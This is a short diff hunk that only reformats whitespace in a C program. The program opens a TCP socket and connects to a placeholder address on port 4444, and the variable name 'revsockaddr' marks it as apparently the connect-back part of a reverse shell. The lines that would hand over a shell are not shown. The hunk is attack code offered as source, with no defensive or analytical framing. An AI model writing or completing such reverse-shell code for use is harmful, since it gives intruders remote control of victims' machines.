@@ -7,12 +7,12 @@
 #include <unistd.h>
 
 int main(void) {
-    int                port = 4444;
+    int port = 4444;
     struct sockaddr_in revsockaddr;
 
-    int sockt                   = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family      = AF_INET;
-    revsockaddr.sin_port        = htons(port);
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("0.0.0.0");
 
     connect(sockt, (struct sockaddr*)&revsockaddr, sizeof(revsockaddr));
